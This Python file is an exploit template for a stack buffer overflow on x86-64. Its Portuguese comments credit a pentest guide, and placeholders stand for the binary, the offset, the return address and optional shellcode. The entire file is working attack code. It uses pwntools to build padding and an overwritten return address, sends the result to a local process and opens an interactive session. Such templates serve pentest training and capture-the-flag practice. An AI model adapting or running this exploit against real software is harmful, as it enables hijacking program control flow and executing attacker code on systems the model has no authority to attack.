#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Template: stack/bof_x86_64 — stack buffer overflow (ret overwrite)
#
# > Fonte: [Bíblia do Pentest BR](https://0xmorte.gitbook.io/bibliadopentestbr/)
# > Seção: Linguagens & Runtimes — memory corruption (stack buffer overflow)
# > Última sincronização: 2026-11-05
#
# Placeholders (substituídos pelo tool ExploitTemplate):
#   $BIN     — caminho do binário vulnerável (ex.: ./vuln)
#   $OFFSET  — offset (bytes) do início do buffer até o return address
#   $RET     — endereço (hex, sem 0x) para o qual retornar (ex.: 40123a)
#   $PAYLOAD — payload adicional opcional (ex.: b"" ou shellcode)
#
# Uso: substitua os placeholders e execute localmente contra o alvo com NX/PIE conforme
# o cenário. Este esqueleto assume um binário x86-64 que copia para um buffer de stack.

from pwn import *

context.arch = "amd64"
context.log_level = "error"

BIN = "$BIN"
OFFSET = $OFFSET
RET = 0x$RET
PAYLOAD = $PAYLOAD

payload = b"A" * OFFSET + p64(RET) + PAYLOAD

p = process(BIN)
p.sendline(payload)
p.interactive()
